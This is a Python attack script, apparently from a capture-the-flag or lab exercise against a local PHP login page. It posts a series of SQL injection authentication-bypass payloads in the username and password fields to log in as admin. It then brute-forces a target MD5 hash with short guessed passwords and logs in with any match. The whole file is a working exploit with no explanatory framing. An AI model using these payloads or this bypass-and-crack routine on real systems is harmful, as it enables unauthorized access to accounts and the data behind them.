import requests
import hashlib

url = "http://127.0.0.1:32892/index.php"
headers = {
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "X-Requested-With": "XMLHttpRequest",
    "Origin": "http://127.0.0.1:32892",
    "Referer": "http://127.0.0.1:32892/"
}
cookies = {"PHPSESSID": "9b8ouneh58t3bjv346lp4s82ol"}

target_hash = "7d39307ae824e70052c0aa16816a9b16"

print("[*] Trying alternative bypass: Make password comparison always true")
print("="*60)

# Strategy: Use SQLi to make the password check return true regardless of actual password
advanced_bypasses = [
    # Try to make password field match itself
    ("admin", "' OR password=password-- "),
    ("admin", "' OR '1'='1' AND username='admin'-- "),
    ("admin", "' OR 1=1 AND username='admin'-- "),
    
    # Try hex bypass
    ("admin", "' OR password=0x" + target_hash + "-- "),
    
    # Try with both fields working together
    ("admin' AND password='7d39307ae824e70052c0aa16816a9b16'-- ", "' OR '1'='1'-- "),
    ("admin' AND '1'='1", "' OR '1'='1'-- "),
    
    # Comment-based bypass on password
    ("admin' AND password='7d39307ae824e70052c0aa16816a9b16", "')-- "),
    
    # Try making password check with OR
    ("admin", "x' OR username='admin' AND password='7d39307ae824e70052c0aa16816a9b16'-- "),
]

for username, password in advanced_bypasses:
    data = {
        "username": username,
        "password": password,
        "submit": "submit"
    }
    
    try:
        response = requests.post(url, headers=headers, cookies=cookies, data=data, timeout=5)
        response_text = response.text.strip()
        
        # Check for any response different from usual
        if response_text not in ['{"response":"username"}', '{"response":"password"}']:
            print(f"\n[!] DIFFERENT RESPONSE!")
            print(f"    Username: {username}")
            print(f"    Password: {password}")
            print(f"    Response: {response_text}")
            
            if "Success" in response_text or "success" in response_text.lower():
                print("[+] BYPASS SUCCESSFUL!")
                if response.cookies:
                    print(f"[+] Cookies: {response.cookies.get_dict()}")
                break
                
    except Exception as e:
        print(f"[-] Error: {e}")

print("\n[*] Trying numeric/special character passwords")
print("="*60)

# Maybe it's a simple numeric or special password
simple_passwords = [
    '0', '1', '2', '00', '01', '10', '11', '000', '001', '010', '100', '111',
    '!', '@', '#', '$', '!!', '@@', '##', '$$',
    'a', 'b', 'aa', 'bb', 'aaa', 'bbb',
    'A', 'B', 'AA', 'BB', 'AAA', 'BBB',
    'x', 'X', 'xx', 'XX', 'xxx', 'XXX',
    'p', 'P', 'pp', 'PP', 'ppp', 'PPP',
    '!@#', '!@#$', '123!', '1!', '1@', '1#',
    'p1', 'p2', 'P1', 'P2',
    'pw', 'PW', 'Pw', 'pw1', 'PW1', 'Pw1',
    'pwd', 'PWD', 'Pwd', 'pwd1', 'PWD1', 'Pwd1'
]

print(f"[*] Testing {len(simple_passwords)} simple passwords...")

for pwd in simple_passwords:
    hash_val = hashlib.md5(pwd.encode()).hexdigest()
    if hash_val == target_hash:
        print(f"\n[!] PASSWORD FOUND: {pwd}")
        print(f"[!] Hash: {hash_val}")
        
        # Login
        data = {
            "username": "admin",
            "password": pwd,
            "submit": "submit"
        }
        response = requests.post(url, headers=headers, cookies=cookies, data=data, timeout=5)
        print(f"[*] Login response: {response.text}")
        break

print("\n[*] Script complete")

